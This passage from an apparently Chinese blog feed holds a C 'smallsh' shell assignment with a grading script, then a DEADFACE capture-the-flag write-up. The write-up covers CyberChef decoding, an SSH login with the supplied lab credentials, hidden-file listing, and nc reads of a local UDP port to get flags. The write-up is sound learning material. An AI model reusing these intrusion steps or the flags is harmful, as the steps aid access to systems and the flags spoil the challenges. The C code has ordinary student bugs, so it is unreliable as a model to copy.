class="built_in">mkdir</span> testdir$$</span><br><span class="line"><span class="built_in">mkdir</span> testdir$$</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">cd</span> testdir$$</span><br><span class="line"><span class="built_in">cd</span> testdir$$</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">pwd</span> (5 points <span class="keyword">for</span> being <span class="keyword">in</span> the newly created <span class="built_in">dir</span>)</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">echo</span> --------------------</span><br><span class="line"><span class="built_in">echo</span> Testing foreground-only mode (20 points <span class="keyword">for</span> entry &amp; <span class="built_in">exit</span> text AND ~5 seconds between <span class="built_in">times</span>)</span><br><span class="line"><span class="built_in">kill</span> -SIGTSTP $$</span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"><span class="built_in">sleep</span> 5 &amp;</span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"><span class="built_in">kill</span> -SIGTSTP $$</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">___EOF___</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight c"><figcaption><span>smallsh.c</span><a href="/downloads/code/smallsh.c">view raw</a></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_INPUT_LENGTH 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ARG_NUMBER 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPLIT_CHAR <span class="string">&quot; \t\r\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> allowBg = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">readLine</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> maxLength = MAX_INPUT_LENGTH;</span><br><span class="line">    <span class="type">char</span> *line = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * maxLength);</span><br><span class="line">    fgets(line, maxLength, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; maxLength; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (line[i] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        {</span><br><span class="line">            line[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> line;</span><br><span class="line">}</span><br><span class="line"><span class="type">char</span> **<span class="title function_">parse</span><span class="params">(<span class="type">char</span> *line, <span class="type">int</span> *num, <span class="type">int</span> *back)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> maxNumber = MAX_ARG_NUMBER;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> **arr = (<span class="type">char</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span> *) * maxNumber);</span><br><span class="line">    <span class="type">char</span> *token;</span><br><span class="line">    token = strtok(line, SPLIT_CHAR);</span><br><span class="line">    <span class="keyword">while</span> (token != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        arr[i] = token;</span><br><span class="line">        <span class="comment">// replace $$</span></span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(arr[i])<span class="number">-1</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (arr[i][j] == <span class="string">&#x27;$&#x27;</span> &amp;&amp; arr[i][j + <span class="number">1</span>] == <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">            {</span><br><span class="line">                arr[i][j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                arr[i][j+<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="type">char</span> t[<span class="number">10</span>];</span><br><span class="line">                <span class="type">char</span> newArg[<span class="number">50</span>];</span><br><span class="line">                <span class="built_in">memset</span>(t, <span class="string">&#x27;\0&#x27;</span>, <span class="number">10</span>);</span><br><span class="line">                <span class="built_in">memset</span>(newArg, <span class="string">&#x27;\0&#x27;</span>, <span class="number">50</span>);</span><br><span class="line">                <span class="built_in">strncpy</span>(newArg, arr[i], j);</span><br><span class="line">                <span class="built_in">sprintf</span>(t, <span class="string">&quot;%d&quot;</span>, getpid());</span><br><span class="line">                <span class="built_in">strcat</span>(newArg, t);</span><br><span class="line">                <span class="comment">// sprintf(arr[i], newArg);</span></span><br><span class="line">                arr[i] = newArg;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        i++;</span><br><span class="line">        token = strtok(<span class="literal">NULL</span>, SPLIT_CHAR);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= <span class="number">2</span> &amp;&amp; <span class="built_in">strcmp</span>(arr[i - <span class="number">1</span>], <span class="string">&quot;&amp;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        arr[i - <span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">            i--;</span><br><span class="line">        <span class="keyword">if</span>(allowBg == <span class="number">1</span>){</span><br><span class="line">            *back = <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *num = i;</span><br><span class="line">    arr[i] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">printStatus</span><span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">0</span> || status == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;exit value %d\n&quot;</span>, status);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;terminated by signal %d\n&quot;</span>, status);</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">catchSIGTSTP</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (allowBg == <span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">char</span> *message = <span class="string">&quot;Entering foreground-only mode(&amp; is now ignored)\n&quot;</span>;</span><br><span class="line">        write(STDOUT_FILENO, message, <span class="number">49</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        allowBg = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="type">char</span> *message = <span class="string">&quot;Exiting foreground-only mode\n&quot;</span>;</span><br><span class="line">        write(STDOUT_FILENO, message, <span class="number">30</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        allowBg = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">catchSIGINT</span><span class="params">(<span class="type">int</span> signo)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> message[] = <span class="string">&quot;terminated by signal &quot;</span>;</span><br><span class="line">    <span class="type">char</span> t[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">memset</span>(t, <span class="string">&#x27;\0&#x27;</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(t, <span class="string">&quot;%d&quot;</span>, signo);</span><br><span class="line">    <span class="built_in">strcat</span>(message, t);</span><br><span class="line">    <span class="built_in">strcat</span>(message, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, message);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">newProcess</span><span class="params">(<span class="type">char</span> **arr, <span class="type">int</span> num, <span class="type">int</span> back)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="type">int</span> status, fd;</span><br><span class="line">    <span class="type">int</span> input_flag = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> output_flag = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[i], <span class="string">&quot;&lt;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">            input_flag = i;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[i], <span class="string">&quot;&gt;&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">            output_flag = i;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigint</span> =</span> {<span class="number">0</span>};</span><br><span class="line">        sigint.sa_handler = catchSIGINT;</span><br><span class="line">        sigemptyset(&amp;sigint.sa_mask);</span><br><span class="line">        sigint.sa_flags = <span class="number">0</span>;</span><br><span class="line">        sigaction(SIGINT, &amp;sigint, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// input redirect</span></span><br><span class="line">        <span class="keyword">if</span> (input_flag &gt; <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            fd = open(arr[input_flag + <span class="number">1</span>], O_RDONLY, <span class="number">0644</span>);</span><br><span class="line">            <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;cannot open %s for input\n&quot;</span>, arr[input_flag + <span class="number">1</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (dup2(fd, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;: Could not redirect stdin for input file %s\n&quot;</span>, arr[input_flag + <span class="number">1</span>]);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                }</span><br><span class="line">                arr[input_flag] = <span class="literal">NULL</span>;</span><br><span class="line">                close(fd);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//output redirect</span></span><br><span class="line">        <span class="keyword">if</span> (output_flag &gt; <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            fd = open(arr[output_flag + <span class="number">1</span>], O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0644</span>);</span><br><span class="line">            <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;cannot not open %s for output\n&quot;</span>, arr[output_flag + <span class="number">1</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (dup2(fd, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Could not redirect stdout for output file %s\n&quot;</span>, arr[output_flag + <span class="number">1</span>]);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                }</span><br><span class="line">                arr[output_flag] = <span class="literal">NULL</span>;</span><br><span class="line">                close(fd);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (back == <span class="number">1</span> &amp;&amp; input_flag &lt; <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            fd = open(<span class="string">&quot;/dev/null&quot;</span>, O_RDONLY, <span class="number">0644</span>);</span><br><span class="line">            <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Could not open \&quot;/dev/null\&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span> (dup2(fd, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Could not redirect stdin to \&quot;/dev/null\&quot;\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                }</span><br><span class="line">                close(fd);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// printf(&quot;%c\n&quot;, arr[0][0]);</span></span><br><span class="line">        <span class="keyword">if</span> (execvp(arr[<span class="number">0</span>], arr) == <span class="number">-1</span> &amp;&amp; arr[<span class="number">0</span>][<span class="number">0</span>] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; arr[<span class="number">0</span>][<span class="number">0</span>] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: no such file or directory\n&quot;</span>, arr[<span class="number">0</span>]);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Smallsh !\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    { <span class="comment">// parent</span></span><br><span class="line">        <span class="keyword">if</span> (back == <span class="number">1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Background pid is %d.\n&quot;</span>, pid);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">            <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">                <span class="keyword">return</span> (WEXITSTATUS(status));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status))</span><br><span class="line">                <span class="keyword">return</span> (WTERMSIG(status));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">executeCommand</span><span class="params">(<span class="type">char</span> **arr, <span class="type">int</span> status, <span class="type">int</span> num, <span class="type">int</span> back)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="literal">NULL</span> || <span class="built_in">strcmp</span>(<span class="string">&quot;#&quot;</span>, arr[<span class="number">0</span>]) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[<span class="number">0</span>], <span class="string">&quot;exit&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[<span class="number">0</span>], <span class="string">&quot;status&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        printStatus(status);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[<span class="number">0</span>], <span class="string">&quot;cd&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">char</span> *directory;</span><br><span class="line">        <span class="keyword">if</span> (arr[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">            directory = getenv(<span class="string">&quot;HOME&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            directory = arr[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (chdir(directory) == <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;cd: No such file or directory\n&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="type">int</span> t = newProcess(arr, num, back);</span><br><span class="line">        <span class="comment">// printf(&quot;------------%d---\n&quot;,t);</span></span><br><span class="line">        <span class="comment">// fflush(stdout);</span></span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *input;</span><br><span class="line">    <span class="type">char</span> **arr;</span><br><span class="line">    <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigint</span> =</span> {<span class="number">0</span>};</span><br><span class="line">    sigint.sa_handler = SIG_IGN;</span><br><span class="line">    sigemptyset(&amp;sigint.sa_mask);</span><br><span class="line">    sigint.sa_flags = <span class="number">0</span>;</span><br><span class="line">    sigaction(SIGINT, &amp;sigint, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigtstp</span> =</span> {<span class="number">0</span>};</span><br><span class="line">    sigtstp.sa_handler = catchSIGTSTP;</span><br><span class="line">    sigfillset(&amp;sigtstp.sa_mask);</span><br><span class="line">    sigtstp.sa_flags = <span class="number">0</span>;</span><br><span class="line">    sigaction(SIGTSTP, &amp;sigtstp, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> back = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        input = readLine();</span><br><span class="line">        arr = parse(input, &amp;num, &amp;back);</span><br><span class="line">        status = executeCommand(arr, status, num, back);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//background</span></span><br><span class="line">        <span class="type">pid_t</span> childPid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG);</span><br><span class="line">        <span class="keyword">if</span> (childPid &gt; <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;background pid %d is done: &quot;</span>, childPid);</span><br><span class="line">            <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;exit value %d\n&quot;</span>, WEXITSTATUS(status));</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;terminated by signal %d\n&quot;</span>, status);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        }</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">free</span>(input);</span><br><span class="line">        <span class="built_in">free</span>(arr);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="wait-函数"><a href="#wait-函数" class="headerlink" title="wait()函数"></a>wait()函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span>* status)</span>;</span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* status, <span class="type">int</span> options)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>WNOHANG 如果该子进程没有结束，则以非阻塞方式等待子进程，并且返回0;如果该子进程已经结束，返回其pid.如果没有子进程退出，则立刻返回-1</li>
<li>WUNTRACED  若子进程进入暂停状态，则马上返回</li>
</ul>
<h2 id="WIFEXTED与WEXITSTATUS"><a href="#WIFEXTED与WEXITSTATUS" class="headerlink" title="WIFEXTED与WEXITSTATUS"></a>WIFEXTED与WEXITSTATUS</h2><ul>
<li>WIFEXTED(status) 这个宏用来获取是否正常退出，正常退出获得true</li>
<li>WEXITSTATUS(status) 只可在WIFEXITED为true时使用，获取正常退出的状态码</li>
</ul>
<h2 id="WIFSIGNALED与WTERMSIG"><a href="#WIFSIGNALED与WTERMSIG" class="headerlink" title="WIFSIGNALED与WTERMSIG"></a>WIFSIGNALED与WTERMSIG</h2><ul>
<li>WIFSIGNALED(status) 这个宏用来获取是否异常退出，异常退出获得true</li>
<li>WTERMSIG(status) 只可在WIFSIGNALED为true时使用，获取异常退出的状态码<figure class="highlight c"><figcaption><span>smallsh.c</span><a href="/downloads/code/smallsh.c">view raw</a></figcaption><table><tr><td class="code"><pre><span class="line">waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">            <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">                <span class="keyword">return</span> (WEXITSTATUS(status));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status))</span><br><span class="line">                <span class="keyword">return</span> (WTERMSIG(status));</span><br></pre></td></tr></table></figure></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>Shell</tag>
        <tag>C语言</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>DEADFACECTF Writeup</title>
    <url>/posts/2879210530/</url>
    <content><![CDATA[<h1 id="Poor-MEAGAN"><a href="#Poor-MEAGAN" class="headerlink" title="Poor MEAGAN!"></a>Poor MEAGAN!</h1><p><em>Oh, NO! Poor Megan! She&#39;s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}.</em></p>
<p><em>The formula for the antidote: j2rXjx9dkhW9eLKsnMR9cLDVjh&#x2F;9dwz1QfGXm+b9&#x3D;wKslL1Zpb45</em></p>
<hr>
<p>看起来像一个base64字符串,但是似乎被混淆了,使用<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('3GHIJKLMNOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5',true)&input=ajJyWGp4OWRraFc5ZUxLc25NUjljTERWamgvOWR3ejFRZkdYbStiOT13S3NsTDFacGI0NQ">CyberChef</a>搭配Megan35解码即可</p>
<p><img data-src="/../../CTF/DEADFACECTF/Crypto/images/Poor_Meagan.png" alt="CyberChef"></p>
<p><strong>flag:</strong><code>flag&#123;Six-Parts-Honey-One-Part-Garlic&#125;</code></p>
<h1 id="To-Be-Xor-Not-to-Be"><a href="#To-Be-Xor-Not-to-Be" class="headerlink" title="To Be Xor Not to Be"></a>To Be Xor Not to Be</h1><p><em>.$)&#x2F;3&lt;&#39;e-)&lt;e&#39;:e&amp;&#39;&lt;e&lt;&#39;e-)&lt;5</em></p>
<p><em>Submit the flag as flag{here-is-the-answer}</em></p>
<hr>
<p>直接使用<a href="https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,'Standard',false,true,false,'flag')&input=LiQpLzM8J2UtKTxlJzplJic8ZTwnZS0pPDU">CyberChef</a>里的XOR Brute Force即可:</p>
<p><img data-src="/../../CTF/DEADFACECTF/Crypto/images/To_Be_Xor_Not_to_Be.png" alt="To_Be_Xor_Not_to_Be"></p>
<p><strong>flag:</strong><code>flag&#123;to-eat-or-not-to-eat&#125;</code></p>
<h1 id="Blood-Bash"><a href="#Blood-Bash" class="headerlink" title="Blood Bash"></a>Blood Bash</h1><p><em>We&#39;ve obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt.</em></p>
<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
<p><em>bloodbash.deadface.io:22</em></p>
<hr>
<p>使用<code>ssh</code>命令连接,<code>ls - R</code>后发现<code>Documents</code>目录下有一个<code>flag.txt</code>文件,直接<code>cat</code>即可.</p>
<pre><code class="shell">╭─ ~/CTF/DEADFACECTF
╰─$ ssh bl0ody_mary@bloodbash.deadface.io
bl0ody_mary@bloodbash.deadface.io&#39;s password: 
bl0ody_mary@16ef1481fce1:~$ ls -R
.:
&#39;De Monne Customer Portal.pdf&#39;   Documents   Downloads   Music   Pictures   Videos

./Documents:
flag1.txt

./Downloads:

./Music:

./Pictures:

./Videos:
bl0ody_mary@16ef1481fce1:~$ cat Documents/flag1.txt
flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125;</code></p>
<h1 id="Blood-Bash-2"><a href="#Blood-Bash-2" class="headerlink" title="Blood Bash 2"></a>Blood Bash 2</h1><p><em>We&#39;ve obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial.</em></p>
<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
<p><em>bloodbash.deadface.io:22</em></p>
<hr>
<p>在<code>Documents</code>目录<code>ls -a</code>后发现存在文件<code>.demonne_info.txt</code>,<code>cat</code>即可</p>
<pre><code class="shell">bl0ody_mary@16ef1481fce1:~$ ls -a
.  ..  flag.txt  .demonne_info.txt
bl0ody_mary@16ef1481fce1:~$ cat .demonne_info.txt
flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125;</code></p>
<h1 id="Blood-Bash-3"><a href="#Blood-Bash-3" class="headerlink" title="Blood Bash 3"></a>Blood Bash 3</h1><p><em>There&#39;s a flag on this system that we&#39;re having difficulty with. Unlike the previous flags, we can&#39;t seem to find a file with this flag in it. Perhaps the flag isn&#39;t stored in a traditional file?</em></p>
<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
<p><em>bloodbash.deadface.io:22</em></p>
<hr>
<p>在Unix&#x2F;Linux系统中“一切皆文件”,socket也被认为是一种文件.</p>
<p>题意提示我们flag没有被存储在传统文件中,运行<code>netstat -ano</code></p>
<pre><code class="shell">bl0ody_mary@5349049d19cd:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
udp        0      0 127.0.0.1:43526         0.0.0.0:*                           off (0.00/0/0)
</code></pre>
<p>注意到有本地43526端口的监听(UDP),用<code>nc</code>连接一下</p>
<pre><code class="shell">bl0ody_mary@16ef1481fce1:~$ nc -u 127.0.0.1 43526
flag&#123;open_port(al)s&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;open_port(al)s&#125;</code></p>
<h1 id="Blood-Bash-4"><a href="#Blood-Bash-4" class="headerlink" title="Blood Bash 4"></a>Blood Bash 4</h1><p><em>A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they&#39;re creating for their consumers. Read the contents of the file and return the flag as <code>flag&#123;flag_goes_here&#125;</code>.</em></p>
